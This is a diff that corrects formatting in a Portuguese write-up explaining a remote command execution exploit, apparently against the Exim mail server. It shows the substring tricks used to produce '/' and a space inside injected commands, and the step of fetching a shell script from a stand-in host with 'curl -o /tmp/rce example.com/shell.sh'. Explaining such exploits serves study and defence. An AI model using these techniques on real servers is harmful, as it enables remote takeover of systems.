@@ -36,7 +36,7 @@ Precisamos atender aos seguintes requisitos para explorar essa vulnerabilidade:
 3. O comando precisa usar um caminho absoluto
 4. Precisa conhecer um nome de usuário existente
 
-Para resolver esses problemas, o autor da vulnerabilidade criou $`substr{0}{1}{$spool_directory}}`em vez de`/`, usando `${substr{10}{1}{$tod_log} } ` método de substituição de espaços.
+Para resolver esses problemas, o autor da vulnerabilidade criou $`substr{0}{1}{$spool_directory}}` em vez de `/`, usando `${substr{10}{1}{$tod_log}}` método de substituição de espaços.
 
 No entanto, ainda há muitos caracteres que não podem ser usados. Portanto, precisamos colocar o comando no site de terceiros e baixá-lo para o diretório `/tmp` por `curl -o /tmp/rce example.com/shell.sh`.
 
